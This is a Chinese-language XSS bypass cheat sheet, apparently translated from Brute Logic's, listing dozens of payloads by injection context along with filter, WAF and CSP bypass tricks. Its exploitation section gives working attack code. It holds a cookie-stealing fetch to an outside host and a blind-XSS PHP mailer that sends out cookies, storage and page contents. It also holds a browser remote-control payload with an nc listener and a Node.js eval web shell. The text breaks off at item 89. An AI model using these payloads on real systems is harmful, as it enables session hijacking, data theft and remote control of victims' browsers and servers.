# XSS绕过姿势总结

#### 0x01基本

##### 1.HTML Injection （代码注入）

```
当输入的payload，被插入到HTML标签或外部标签的属性值内时，则使用下面的方法进行测试，如果输入的内容被插入到了HTML注释，则在payload之前添加"->"

<svg οnlοad=alert(1)>
"><svg οnlοad=alert(1)>
```

##### 2.HTML Injection – Tag Block Breakout（HTML注入–标签闭合）

```
当输入的payload，被插入到以下标签的内部时，使用以下标签：<title> <style> <script> <textarea> <noscript> <pre> <xmp> <iframe> （</tag>为相应的html标签）。

</tag><svg οnlοad=alert(1)>
"></tag><svg οnlοad=alert(1)>
```

##### 3.HTML Injection - Inline （HTML注入-内联标签）

```
当输入的payload，被插入到HTML标签的属性值内，但该标签不能以大于号（>）进行闭合。<br>

"οnmοuseοver=alert(1) //
"autofocus οnfοcus=alert(1) //
```

##### 4.HTML Injection - Source（HTML注入-源）

```
当输入的payload，被作为以下HTML标签属性的值使用时：href，src，data或action。payload中的src属性值可以是一个URL或者"data:,alert(1)"。

javascript:alert(1)
```

##### 5.Javascript Injection (javascript注入)

```
当输入的payload，被插入到javascript标签块中的字符串定界值中时使用。

'-alert(1)-'
'/alert(1)//
```

##### 6.Javascript Injection - Escape Bypass (javascript注入-绕过)

```
当输入的payload，被插入到javascript标签块字符串定界值中，但具有单引号，可以尝试使用反斜杠注释进行绕过。

\'/alert(1)//
```

##### 7.Javascript Injection – Script Breakout (javascript注入-脚本突破)

```
当输入的payload，被插入到javascript标签块中的任何位置时使用。

</script><svg οnlοad=alert(1)>
```

##### 8.Javascript Injection - Logical Block (javscript注入-逻辑代码块)

```
当输入的payload，被插入到javascript标签块时，使用第一个或第二个payload，该值如果位于字符串分隔值或在单个逻辑代码块（如函数或条件（if，else，等等中）。 如果需要引用转义反斜杠，请使用第3个payload。

'}alert(1);{'
'}alert(1)%0A{'
\'}alert(1);{//
```

##### 9.Javascript Injection - Quoteless (javscript注入-无变量名)

```
当输入的payload在同一行javascript代码中有多次反射时使用。

第一个payload适用于简单的javascript变量，第二个payload适用于非嵌套的javascript对象。 <br>

/alert(1)//\
/alert(1)}//\
```

##### 10.Javascript Context - Placeholder Injection in Template Literal (javascript注入-模板文字中的占位符注入)

```
当输入的payload被插入到反引号（``）分隔的字符串内或模板引擎中时使用。<br>

${alert(1)}
```

##### 11.Multi Reflection HTML Injection - Double Reflection (Single Input) (HTML注入多重反射-双重反射（单输入）)

```
payload用于利用同一页面上的多次反射。<br>

'οnlοad=alert(1)><svg/1='
'>alert(1)</script><script/1='
*/alert(1)</script><script>/*
```

##### 12.Multi Reflection i HTML Injection - Triple Reflection (Single Input) (HTML注入多重反射-三次反射（单输入）)

```
payload用于利用同一页面上的多次反射。<br>

*/alert(1)">'οnlοad="/*<svg/1='
`-alert(1)">'οnlοad="`<svg/1='
*/</script>'>alert(1)/*<script/1='
```

##### 13.Multi Input Reflections HTML Injection - Double & Triple (HTML注入多输入反射-两次和三次)

```
payload用于利用同一页面上的多个输入反射。在HPP（HTTP参数污染）其中存在重复参数的反射。 第三个payload利用相同参数的逗号分隔进行反射。<br>

p=<svg/1='&q='οnlοad=alert(1)>
p=<svg 1='&q='οnlοad='/*&r=*/alert(1)'>
q=<script/&q=/src=data:&q=alert(1)>
```

##### 14.File Upload Injection – Filename (文件上传注入-文件名)

```
payload用于用户上传的文件名返回在目标页面的某处时使用。

"><svg οnlοad=alert(1)>.gif
```

##### 15.File Upload Injection – Metadata (文件上传注入-元数据)

```
payload用于，当上传文件的元数据返回在目标页面中的某处时使用。 它可以使用命令行exiftool（"$"是终端提示），并且可以设置任何元数据字段。

$ exiftool -Artist='"><svg οnlοad=alert(1)>' xss.jpeg
```

##### 16.File Upload Injection – SVG File (文件上传注入-SVG文件)

```
上传图像文件时，用于在目标上创建存储的XSS payload。 将以下内容另存为"xss.svg"文件 <br>

<svg xmlns="http://www.w3.org/2000/svg" οnlοad="alert(1)"/>
```

##### 17.DOM Insert Injection (DOM 注入)

```
当注入的payload作为有效标记插入DOM中，而不是反映在源代码中时，用于测试XSS。它适用于html标签和其他payload无效的情况下使用。<br>

<img src=1 οnerrοr=alert(1)>
<iframe src=javascript:alert(1)>
<details open οntοggle=alert(1)>
<svg><svg οnlοad=alert(1)>
```

##### 18.DOM Insert Injection – Resource Request (DOM 注入-资源请求)

```
当网站调用本地的javascript代码发送请求，并且将请求的结果插入到页面中时，如果攻击者可以控制该URL。则可以使用以下payload进行测试 <br>

data:text/html,<img src=1 οnerrοr=alert(1)>
data:text/html,<iframe src=javascript:alert(1)>
```

##### 19.PHP Self URL Injection (PHP self URL注入)

```
当网站服务器端PHP代码，将当前URL当作HTML表单属性值进行获取。payload在斜杠（/）在php扩展名和查询部分的开始（？）之间插入。<br>

https://brutelogic.com.br/xss.php/"><svg οnlοad=alert(1)>?a=reader
```

##### 20.Markdown Vector (Markdown 组件测试)

```
在网站允许某些markdown标记，比如：输入的文本框，注释部分等中使用payload。点击触发。<br>

[clickme](javascript:alert`1`)
```

##### 21.Script Injection - No Closing Tag (脚本注入-没有结束标记)

```
payload在反射后的javascript代码中有结束脚本标签（</script>）时使用。 <br>

<script src=data:,alert(1)>
<script src=//brutelogic.com.br/1.js>
```

##### 22.Javascript postMessage() DOM Injection (with Iframe) (Javascript postMessage() DOM注入（带有Iframe）)

```
在JavaScript代码中有"message"事件监听器(如"window.addEventListener('message',...)")时使用该payload，并且服务器端没有检查来源。 如果能够对目标进行请求伪造（根据http请求 X-Frame Options标头）。 则另存一个HTML文件（或者使用data:text/html，以提供TARGET_URL和INJECTION（xss payload）进行测试。<br>

<iframe src=TARGET_URL οnlοad="frames[0].postMessage('INJECTION','*')">
```

##### 23.XML-Based XSS (基于XML的XSS)

```
该payload用于在XML页面(内容类型为text/xml或application/xml）中进行测试。如果输入点位于注释部分，则在payload前添加"->"；如果输入位于CDATA部分，则将"->"添加payload。<br>

<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>
<x:script xmlns:x="http://www.w3.org/1999/xhtml" src="//brutelogic.com.br/1.js"/>
```



#### 0x02高级


##### 24.AngularJS Injections (v1.6 and up) (AngularJS注入(v1.6及更高版本))。

```
第一个payload用于在页面中，带有ng-app指令的HTML块中进行测试。 第二个payload用于创建自己的AngularJS库时使用。

{{$new.constructor('alert(1)')()}}
<x ng-app>{{$new.constructor('alert(1)')()}}
```

##### 25.Onscroll Universal Vector (通用Onscroll事件 测试payload)

```
使用onscroll事件处理web应用时，用户无需交互即可触发XSS漏洞。它与address, blockquote, body, center, dir, div, dl, dt, form, li, menu, ol, p, pre, ul,和h1到h6HTML标签一起使用。 

<p style=overflow:auto;font-size:999px οnscrοll=alert(1)>AAA<x/id=y></p>#y
```

##### 26.Type Juggling (类型戏法)

```
该payload用于在web应用不够严格对比匹配数字的"if"条件中使用。

1<svg οnlοad=alert(1)>
1"><svg οnlοad=alert(1)>
```

##### 27.XSS in SSI (SSI中的XSS漏洞)

```
该payload在服务器端包含（SSI）注入时使用。

<<!--%23set var="x" value="svg οnlοad=alert(1)"--><!--%23echo var="x"-->>
```

##### 28.SQLi Error-Based XSS (基于sql显注的XSS)

```
该payload在可以触发SQL错误消息（带引号或反斜杠）的功能点中进行测试。

'1<svg οnlοad=alert(1)>
<svg οnlοad=alert(1)>\
```


##### 29.Injection in JSP Path (JSP路径中的xss注入)

```
该payload可以在基于JSP的程序，测试应用的路径中使用。<br>

//DOMAIN/PATH/;<svg οnlοad=alert(1)>
//DOMAIN/PATH/;"><svg οnlοad=alert(1)>
```

##### 30.JS Injection - ReferenceError Fix (javascript注入-修复ReferenceError错误)

```
该payload用于修复一些javascript代码的语法。 通过查看浏览器开发人员工具（F12）中的"控制台"选项卡，是否有相应的ReferenceError，并相应地替换变量和函数名称进行测试。<br>

';alert(1);var myObj='
';alert(1);function myFunc(){}'
```

##### 31.Bootstrap Vector (up to v3.4.0) (Bootstrap最新版xss测试)

```
该payload用于web应用调用bootstrap库时进行测试。 href值的任何char都可以进行HTML编码，只需单击页面中的任意位置即可触发，并且绕过Webkit Auditor过滤器。 <br>

<html data-toggle=tab href="<img src=x οnerrοr=alert(1)>">
```

##### 32.Browser Notification (浏览器通知)

```
以下payload用作alert()，prompt()和confirm()函数的替代方法。 如果用户已经触发第一个payload，就可以使用第二个payload进行测试。<br>

Notification.requestPermission(x=>{new(Notification)(1)})
new(Notification)(1)
```

##### 33.XSS in HTTP Header - Cached (HTTP请求头中-缓存xss)

```
该payload用于使用MISS-MISS-HIT缓存方案（如果服务器端开启）在应用程序中测试存储XSS。 将XSS标签替换为相应的payload，并将TARGET替换为虚拟字符串， 触发相同的请求3次，以避免页面的实际缓存信息。<br>

$ curl -H "Vulnerable_Header: <XSS>" TARGET/?dummy_string
```

#### 0x03绕过

##### 34.Mixed Case（大小写混合）

```
该payload用于绕过区分大小写的xss过滤器。

<Svg OnLoad=alert(1)>
<Script>alert(1)</Script>
```

##### 35.Unclosed Tags（未闭合标签）

```
该payload在HTML注入中使用，可避免同时存在小于（<）和大于（>）符号的情况。

<svg οnlοad=alert(1)//
<svg οnlοad="alert(1)"
```

##### 36.Uppercase XSS (大写 XSS)

```
当web应用以大写形式返回用户的输入时使用该payload。 URL中将"＆"替换为"％26"，将"＃"替换为"％23"。

<SVG ONLOAD=alert(1)>
<SCRIPT SRC=//BRUTELOGIC.COM.BR/1></SCRIPT>
```

##### 37.Extra Content for Script Tags (脚本标签的额外内容)

```
当web应用过滤器查找带有某些变体的"<script>"或"<script src = ..."但不检查其他属性时使用该payload。

<script/x>alert(1)</script>  
```

##### 38.Double Encoded XSS (双重编码的XSS)

```
当web应用程序对用户输入的内容执行双重解码时使用该payload。

%253Csvg%2520o%256Eload%253Dalert%25281%2529%253E
%2522%253E%253Csvg%2520o%256Eload%253Dalert%25281%2529%253E
```

##### 39.Alert without Parentheses (Strings Only) (没有括号的弹窗（仅字符串）)

```
当web应用不允许使用括号并且常规的alert可以使用时，可在HTML向量或javascript注入payload进行使用。 

alert`1`
```

##### 40.Alert without Parentheses (不带括号的弹窗)

```
当web应用不允许使用括号并且PoC需要返回任意目标信息时，可在HTML标签或javascript注入该payload中使用。 

setTimeout`alert\x28document.domain\x29`
setInterval`alert\x28document.domain\x29`
```

##### 41.Alert without Parentheses – HTML Entities (不带括号的弹窗– HTML实体)

```
当前的payload只能在HTML代码注入中使用，当web应用不允许使用括号时。 在URL中将"＆"替换为"％26"，将"＃"替换为"％23"。 

<svg οnlοad=alert(1)>
<svg οnlοad=alert(1)>
```

##### 42.Alert without Alphabetic Chars (不带字母字符的弹窗)

```
当前web应用不允许使用字母字符时使用该payload。以下是alert(1)的payload 

[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162']
('\141\154\145\162\164\50\61\51')()
```

##### 43.Alert Obfuscation (弹窗混淆)

```
以下payload用于欺骗基于正则表达式（regex）的过滤器。 可以将其与以前的绕过方法结合使用。 根据上下文，最短的选项"top"也可以替换为"window"，"parent"，"self"或者"this" 

(alert)(1)
a=alert,a(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
top['al\145rt'](1)
top[8680439..toString(30)](1)
```

##### 44.Alert Alternative – Write & Writeln (弹窗代替方案-Write & Writeln)

```
以下payload用作弹窗函数:alert，prompt,confirm的替代方法。 如果在HTML标签块中则可以直接使用，但如果是javascript注入，则需要完整的"document.write"形式。 URL中将"＆"替换为"％26"，将"＃"替换为"％23"。 可以用writeln代替Write。 

write`XSSed!`
write`<img/src/oNerror=alert(1)>`
write('\74img/src/o\156error\75alert\501\51\76')
```

##### 45.Alert Alternative – Open Pseudo-Protocol (弹窗代替方案-使用伪协议打开)  

```
以下payload用作弹窗函数:alert，prompt,confirm的替代方法。 以上技巧也适用于此。 但只有第二个payload可以在基于Chromium的浏览器中触发，并且需要<iframe name = 0>。

top.open`javas\cript:al\ert\x281\x29`
top.open`javas\cript:al\ert\x281\x29${0}0`
```

##### 46.Alert Alternative - Eval + URL (弹窗代替方案-eval+url)  

```
以下payload用作弹窗函数:alert，prompt,confirm的替代方法。第一个payload是原始形式，第二个payload是eval，它使用payload的id属性值替换eval。 URL必须采用以下方式:在PHP扩展后的URL路径中或URL的片段中。 加号（+）必须用URL进行编码。

<svg οnlοad=eval(" ' "+URL)>
<svg id=eval οnlοad=top[id](" ' "+URL)>
PoC URL必须包含以下之一： 

=> FILE.php/'/alert(1)//?...
=> #'/alert(1)
```

##### 47.Alert Alternative - Eval + URL with Template Literal (弹窗代替方案-带有模板文字的Eval + URL) 

```
${alert(1)}<svg οnlοad=eval('`//'+URL)>
```


##### 48.HTML Injection - Inline Alternative (HTML注入-内联替代)  以下payload用于绕过黑名单。

```
"onpointerover=alert(1) //
"autofocus οnfοcusin=alert(1) //

```

##### 49.Strip-Tags Based Bypass (基于去除标签的绕过)

```
以下payload用于,当过滤器filter去掉<and>标签字符之间的任何内容时进行测试，如PHP的strip_tags()功能,但仅限内联注入 

"o<x>nmouseover=alert<x>(1)//
"autof<x>ocus o<x>nfocus=alert<x>(1)//
```

##### 50.File Upload Injection – HTML/js GIF Disguise (文件上传注入- HTML/js GIF伪装)

```
以下payload用于通过文件上传绕过CSP限制。将下面的所有内容保存为"xss.gif"或"xss.js"（用于严格的MIME检查）。这是PHP的image/gif文件,它可以通过<link rel=import href=xss.gif>（也称为"xss.js"）或<script src=xss.js></script>导入到目标web应用。

GIF89a=//<script>
alert(1)//</script>;
```

##### 51.Jump to URL Fragment (url分段跳转)

```
例如，当我们需要在payload中隐藏一些会触发WAF的关键字符,可以在URL片段（#）之后使用各自的payload进行绕过。

eval(URL.slice(-8)) #alert(1)
eval(location.hash.slice(1)) #alert(1)
document.write(decodeURI(location.hash)) #<img/src/οnerrοr=alert(1)>
```

##### 52.Second Order XSS Injection (二阶XSS注入)

```
当我们的输入的内容将会被使用两次时，例如存储在数据库中，然后进行检索以供后面使用或插入到DOM中时,使用以下的payload进行测试 

<svg/onload=alert(1)>
```

##### 53.PHP Spell Checker Bypass (PHP拼写检查绕过)

```
以下payload用于绕过PHP的pspell_new()函数，该函数提供一个字典来尝试猜测用于搜索的输入. 

<scrpt>confirm(1)</scrpt>
```

##### 54.Event Origin Bypass for postMessage() XSS (postMessage()事件源XSS绕过)

```
以下payload用于在目标的javascript代码中可以绕过对源代码的检查时进行测试，将允许的源代码检查的参数,用于发送payload攻击域的子域。在本地主机上使用CrossPwn脚本作为示例（在附加部分中进行提供）。

http://facebook.com.localhost/crosspwn.html?target=//brutelogic.com.br/tests/
status.html&msg=<script>alert(1)</script>
```

##### 55.CSP Bypass (for Whitelisted Google Domains) (CSP 绕过(通过谷歌白名单域名))

```
以下payload用于,当存在允许这些白名单域执行CSP（内容安全策略）时使用。

<script src=//www.google.com/complete/search?client=chrome%26jsonp=alert(1)>
</script>
<script src=//www.googleapis.com/customsearch/v1?callback=alert(1)></script>
<script src=//ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js>
</script><x ng-app ng-csp>{{$new.constructor('alert(1)')()}}

```

##### 56.SVG Vectors with Event Handlers (带有事件处理程序的SVG向量)

```
以下payload它可以在Firefox上触发，但是通过在<set>中添加attributename=x参数也可以在Chromium中工作。用于黑名单绕过,"Set"也可以替换为"animate"。

<svg><set onbegin=alert(1)>
<svg><set end=1 οnend=alert(1)>
```

##### 57.SVG Vectors without Event Handlers (不带事件处理程序的SVG向量)

```
以下payload用于避免过滤器查找事件处理程序或src、data等。进行url编码后的最后一个payload仅适用于Firefox 

<svg><a><rect width=99% height=99% /><animate attributeName=href
to=javascript:alert(1)>
<svg><a><rect width=99% height=99% /><animate attributeName=href
values=javascript:alert(1)>
<svg><a><rect width=99% height=99% /><animate attributeName=href to=0
from=javascript:alert(1)>
<svg><use xlink:href=data:image/svg
%2Bxml;base64,PHN2ZyBpZD0ieCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAv
c3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI
%2BPGVtYmVkIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIiBzcmM9Imp
hdmFzY3JpcHQ6YWxlcnQoMSkiLz48L3N2Zz4=%23x>
```

##### 58.Vectors without Event Handlers (不带事件处理程序的向量)

```
如果web应用不允许，则payload用作事件处理程序的替代项。如payload本身所述,有些需要用户交互才能触发 

<script>alert(1)</script>
<script src=data:,alert(1)>
<iframe src=javascript:alert(1)>
<embed src=javascript:alert(1)>
<a href=javascript:alert(1)>click
<math><brute href=javascript:alert(1)>click
<form action=javascript:alert(1)><input type=submit>
<isindex action=javascript:alert(1) type=submit value=click>
<form><button formaction=javascript:alert(1)>click
<form><input formaction=javascript:alert(1) type=submit value=click>
<form><input formaction=javascript:alert(1) type=image value=click>
<form><input formaction=javascript:alert(1) type=image src=SOURCE>
<isindex formaction=javascript:alert(1) type=submit value=click>
<object data=javascript:alert(1)>
<iframe srcdoc=<svg/onload=alert(1)>>
<svg><script xlink:href=data:,alert(1) />
<math><brute xlink:href=javascript:alert(1)>click
```

##### 59.Vectors with Agnostic Event Handlers (带有未知事件处理程序的向量)

```
如果web应用不允许使用所有已知的HTML标记名时，请使用以下payload。任何字母字符或字符串都可以用作标签名名来代替"x"。 如payload本身所述,有些需要用户交互才能触发.

<x contenteditable οnblur=alert(1)>lose focus!
<x οnclick=alert(1)>click this!
<x οncοpy=alert(1)>copy this!
<x οncοntextmenu=alert(1)>right click this!
<x onauxclick=alert(1)>right click this!
<x oncut=alert(1)>copy this!
<x οndblclick=alert(1)>double click this!
<x οndrag=alert(1)>drag this!
<x contenteditable οnfοcus=alert(1)>focus this!
<x contenteditable οninput=alert(1)>input here!
<x contenteditable οnkeydοwn=alert(1)>press any key!
<x contenteditable οnkeypress=alert(1)>press any key!
<x contenteditable οnkeyup=alert(1)>press any key!
<x οnmοusedοwn=alert(1)>click this!
<x οnmοuseenter=alert(1)>hover this
<x οnmοusemοve=alert(1)>hover this!
<x οnmοuseοut=alert(1)>hover this!
<x οnmοuseοver=alert(1)>hover this!
<x οnmοuseup=alert(1)>click this!
<x contenteditable οnpaste=alert(1)>paste here!
<x onpointercancel=alert(1)>hover this!
<x onpointerdown=alert(1)>hover this!
<x onpointerenter=alert(1)>hover this!
<x onpointerleave=alert(1)>hover this!
<x onpointermove=alert(1)>hover this!
<x onpointerout=alert(1)>hover this!
<x onpointerover=alert(1)>hover this!
<x onpointerup=alert(1)>hover this!
<x onpointerrawupdate=alert(1)>hover this!
```

##### 60.Mixed Context Reflection Entity Bypass (反射实体混合上下文绕过)

```
以下payload用于在实际有效的js代码中的脚本块中转换特定的代码。它需要以在HTML和javascript上下文标签这种顺序执行，并且相关联彼此。 这个svg标记将使下一个脚本块中的单引号编码为'或'，并触发弹窗。 以下javascript场景的payload，分别为： 消除单引号、完全转义单引号、消除双引号和完全转义双引号 

">'-alert(1)-'<svg>
">'-alert(1)-'<svg>
">alert(1)-"<svg>
"">alert(1)-"<svg>
```

##### 61.Strip-My-Script Vector (去除脚本向量)

```
以下payload用于欺骗xss过滤器,用于去除最经典和最知名的XSS payload,它的工作原理是"<script>"标签被删除。 

<svg/on<script><script>load=alert(1)//</script>  
```

##### 62.Javascript Alternative Comments (Javascript注释替代)

```
以下payload用于,当不允许、转义或删除常规javascript注释（//）时使用。

<!--
%0A-->
```

##### 63.JS Lowercased Input (javascript小写输入)

```
以下payload用于当目标应用程序通过javascript将输入转换为小写时使用。它也可以用于服务器端的小写操作。 

<SCRİPT>alert(1)</SCRİPT>
<SCRİPT/SRC=data:,alert(1)>
```

##### 64.Overlong UTF-8 (超长UTF-8)

```
以下payload用于当目标应用程序执行最佳匹配标签时使用。 

%CA%BA>%EF%BC%9Csvg/onload%EF%BC%9Dalert%EF%BC%881)>
```

##### 65.Vectors Exclusive for ASP Pages (ASP网页专用payload)

```
以下payload用于绕过.asp页中的<[alpha]筛选。

%u003Csvg οnlοad=alert(1)>
%u3008svg οnlοad=alert(2)>
%uFF1Csvg οnlοad=alert(3)>
```

##### 66.PHP Email Validation Bypass (PHP电子邮件验证绕过)

```
以下payload用于绕过PHP的FILTER_var()函数的FILTER_VALIDATE_EMAIL(筛选验证电子邮件)标志。

"><svg/οnlοad=alert(1)>"@x.y
```

##### 67.PHP URL Validation Bypass (PHP URL验证绕过)

```
以下payload用于绕过PHP的FILTER_var()函数的FILTER_VALIDATE_EMAIL(筛选验证电子邮件)标志。

javascript://%250Aalert(1)
```

##### 68.PHP URL Validation Bypass – Query Required (PHP URL验证绕过-需要查询)

```
以下payload用于绕过PHP需要筛选标志查询(FILTER_FLAG_QUERY_REQUIRED),筛选验证电子邮件(FILTER_VALIDATE_EMAIL)的filter_var()函数。

javascript://%250Aalert(1)//?1
javascript://%250A1?alert(1):0
(with domain filter)
javascript://https://DOMAIN/%250A1?alert(1):0
```

##### 69.DOM Insertion via Server Side Reflection (通过服务器端反射插入DOM)

```
以下payload用于,当输入被反射到源中而不能执行时使用,为了避免浏览器筛选和WAF,插入到DOM中。

\74svg o\156load\75alert\501\51\76
```

##### 70.XML-Based Vector for Bypass (基于XML的绕过)

```
以下payload用于在XML网页中绕过浏览器筛选和WAF。 如果输入插入到了注释节点中，则在payload前加一个"->"，如果输入落在CDATA节中，则在有效负载前加一个]]>。

<_:script xmlns:_="http://www.w3.org/1999/xhtml">alert(1)</_:script>
```

##### 71.Javascript Context - Code Injection (IE11/Edge Bypass) (Javascript上下文-代码注入（IE11/Edge 绕过）)

```
以下payload用于在注入javascript上下文时,绕过Microsoft IE11或Edge浏览器。 

"'>confirm(1)</Script><Svg><Script/1='
```

##### 72.Javascript Pseudo-Protocol Obfuscation (Javascript伪协议混淆)

```
以下payload用于绕过查找javascript:alert(1)的筛选器。在添加alert(1)之前，请确保它可以与"1"成功弹窗,这个payload可能需要一些额外的模糊处理,通过url编码,才能完全绕过过滤器。最后一个选项仅适用于payload的DOM操作（例如在基于位置的payload或基于DOM的XSS中）。

javascript:1
javascript:1
javascript :1
javascript:1
"javas%0Dcript:1"
%00javascript:1
```

##### 73.AngularJS Injection (v1.6+) – No Parentheses, Brackets or Quotes (AngularJS注入-无括号、括号或引号)

```
以下payload用于避免xss过滤。第一,二个payload为了避免括号,最后一个payload,通过在URL中通正确编码,在相同或分离的注入点中使用它来避免引号。 

{{$new.constructor('alert\u00281\u0029')()}}
{{$new.constructor('alert(1)')()}}
<x ng-init=a='alert(1)'>{{$new.constructor(a)()}}
```

##### 74.Inside Comments Bypass (内部评论绕过)

```
如果HTML注释中允许任何内容，则使用payload（regex:/<！--.*-->/). 

<!--><svg οnlοad=alert(1)-->
```

#### 0x04利用

##### 75.Agnostic Event Handlers Vectors – Native Script Based (未知事件处理程序向量-基于本机脚本)

```
以下带有事件处理程序的payload，可以与任意标记名一起使用，这有助于绕过黑名单检测。它们需要在注入之后在页面中加载一些脚本。请记住，在下面的处理程序中使用诸如"<b"之类的现有标记名,可能是在某些情况下触发xss的唯一方法。

<x onafterscriptexecute=alert(1)>
<x onbeforescriptexecute=alert(1)>
```

##### 76.Agnostic Event Handlers Vectors – CSS3 Based (未知事件处理程序向量——基于CSS3) 

```
以下带有带有事件处理程序的向量，可以与任意标记名一起使用，这有助于绕过黑名单。它们需要<style>标签,或使用<link>标签导入样式表。最后 四个payload只适用于火狐。

<x onanimatiοnend=alert(1)><style>x{animation:s}@keyframes s{}
<x onanimationstart=alert(1)><style>x{animation:s}@keyframes s{}
<x onwebkitanimatiοnend=alert(1)><style>x{animation:s}@keyframes s{}
<x onwebkitanimationstart=alert(1)><style>x{animation:s}@keyframes s{}
<x ontransitiοnend=alert(1)><style>*{transition:color 1s}*:hover{color:red}
<x ontransitionrun=alert(1)><style>*{transition:color 1s}*:hover{color:red}
<x ontransitionstart=alert(1)><style>*{transition:color 1s}*:hover{color:red}
<x ontransitioncancel=alert(1)><style>*{transition:color 1s}*:hover{color:red}
```

##### 77.Remote Script Call (远程脚本调用)

```
以下payload用于当需要调用外部脚本,但XSS向量是基于web应用处理程序的脚本时使用(如<svg οnlοad=)或通过javascript注入  "brutelogic.com.br"域和HTML,js文件为例。如果以某种方式过滤">"，请将"r=>"或"w=>"替换为 "function()"。

=> HTML-based
(response must be HTML with an Access-Control-Allow-Origin (CORS) header)
"var x=new XMLHttpRequest();x.open('GET','//brutelogic.com.br/0.php');x.send();
x.onreadystatechange=function(){if(this.readyState==4){write(x.responseText)}}"
fetch('//brutelogic.com.br/0.php').then(r=>{r.text().then(w=>{write(w)})})

(with fully loaded JQuery library)
$.get('//brutelogic.com.br/0.php',r=>{write(r)})

=> Javascript-based
(response must be javascript)
with(document)body.appendChild(createElement('script')).src='//brutelogic.com.br/2.js'

(with fully loaded JQuery library)
$.getScript('//brutelogic.com.br/2.js')
(CORS and js extension required)
import('//domain/file')
```

##### 78.Invisible Foreign XSS Embedding (不可见的外部XSS嵌入)

```
以下payload用于将XSS从另一个域（或子域）加载到当前域中。受限于目标域的X-Frame-Options（XFO）头文件。 下面是brutelogic.com.br上下文中的弹窗示例,不分域名。

<iframe src="//brutelogic.com.br/xss.php?a=<svg οnlοad=alert(document.domain)>"
style=display:none></iframe>
```

##### 79.Simple Virtual Defacement (简单的虚假网页信息)

```
以下payload用于更改网站HTML代码的显示方式。在下面的例子中显示"Not Found"消息。

documentElement.innerHTML='<h1>Not Found</h1>'
```

##### 80.Blind XSS Mailer (xss邮件盲打)

```
以下payload将其于远程XSS盲打脚本，另存为PHP文件并更改$to和$headers变量  因此。需要一台Postfix这样的工作邮件服务器。

<?php header("Content-type: application/javascript"); ?>
var mailer = '<?= "//" . $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"] ?>';
var msg = 'USER AGENT\n' + navigator.userAgent + '\n\nTARGET URL\n' + document.URL;
msg += '\n\nREFERRER URL\n' + document.referrer + '\n\nREADABLE COOKIES\n' +
document.cookie;
msg += '\n\nSESSION STORAGE\n' + JSON.stringify(sessionStorage) + '\n\nLOCAL
STORAGE\n' + JSON.stringify(localStorage);
msg += '\n\nFULL DOCUMENT\n' + document.documentElement.innerHTML;
var r = new XMLHttpRequest();
r.open('POST', mailer, true);
r.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
r.send('origin=' + document.location.origin + '&msg=' + encodeURIComponent(msg));
<?php
header("Access-Control-Allow-Origin: " . $_POST["origin"]);
$origin = $_POST["origin"];
$to = "myName@myDomain";
$subject = "XSS Blind Report for " . $origin;
$ip = "Requester: " . $_SERVER["REMOTE_ADDR"] . "\nForwarded For: ".
$_SERVER["HTTP_X_FORWARDED_FOR"];
$msg = $subject . "\n\nIP ADDRESS\n" . $ip . "\n\n" . $_POST["msg"];
$headers = "From: report@myDomain" . "\r\n";
if ($origin && $msg) mail($to, $subject, $msg, $headers);
?>
```

##### 81.Browser Remote Control (浏览器远程控制)

```
以下payload用于监控浏览器并以交互方式,向其发送javascript命令。注入下面的javascript代码而不是alert(1)，会打开一个类似Unix的终端，使用下面的shell脚本（监听器）。将主机的主机名、IP地址或域名提供给从攻击者机器,然后接收命令去执行。

=> Javascript (payload):
setInterval(function(){with(document)body.
appendChild(createElement('script')).src='//HOST:5855'},100)

=> Listener (terminal command):
$ while :; do printf "j$ "; read c; echo $c | nc -lp 5855 >/dev/null; done
```

##### 82.Node.js Web Shell (Node.js web后门)

```
以下payload用于在易受攻击的Node.js应用程序中创建web后门,在运行下面的有效负载之后，按以下方式使用shell  shell:http://target:5855/?cmd=my_node.js_command  弹出计算示例：cmd=require('child_process').exec('gnome-calculator') 

require('http').createServer(function(req,res){res.end(1-
eval(require('url').parse(req.url,1).query.cmd))}).listen(5855)
```

##### 83.Cookie Stealing (窃取cookie信息)

```
用于从目标站点设置的受害者用户获取所有cookie。如果无法通过httpOnly安全标志。则在URL中将"+"编码为"%2B" 

fetch('//brutelogic.com.br/?c='+document.cookie)
```

##### 84.XSS Online Test Page (XSS在线测试页面)

```
以下地址用于练习XSS向量和有效载荷。检查注入点的源代码。 

https://brutelogic.com.br/xss.php


```

#### 0x05额外

##### 85.HTML Entities Table (HTML实体表)

```
用于HTML编码字符。

https://brutelogic.com.br/utils/charref.htm
```

##### 85.Multi-Case HTML Injection (多案例HTML注入)

```
以下payload可作为一次测试机会，它有更高的成功XSS率。它适用于HTML上下文的所有情况（参见基础部分），包括带有标记注入的JS上下文。

</Script/"'--><Body /Autofocus /OnFocus = confirm`1` <!-->
```

##### 86.Multi-Case HTML Injection - Base64 (多案例HTML注入-Base64)

```
以下payload,在Base64编码以后中作为一次测试机会,可获得更高的XSS成功率。它适用于HTML上下文的所有情况（参见基础部分），包括带有标记注入的JS上下文。

PC9TY3JpcHQvIictLT48Qm9keSAvQXV0b2ZvY3VzIC9PbkZvY3VzID0gY29uZmlybWAxYC
A8IS0tPg==
```

##### 87.Vectors for Fixed Input Length (固定输入长度的payload)

```
以下payload在输入必须具有固定长度时使用 

MD5    12345678901 <svg/οnlοad=alert(1)>
SHA1   1234567890123456789 <svg/οnlοad=alert(1)>
SHA256 1234567890123456789012345678901234567890123 <svg/οnlοad=alert(1)>
```

##### 88.PHP Sanitizing for XSS (PHP xss过滤)

```
以下代码只用于阻止每个上下文中的xss，只要输入不返回在非分隔字符串、反勾号中间或任何其他类似于eval的函数（JS上下文中的所有函数）中。但是它不防止基于DOM的XSS，只防止基于源代码的XSS。

$input = preg_replace("/:|\\\/", "", htmlentities($input, ENT_QUOTES))
```

##### 89.JavaScript Execution Delay (javascript执行延迟)

```
以下payload基于JQuery的外部调用为例,当javascript库或任何其他需要注入的资源,在payload的执行中未完全加载时使用。 

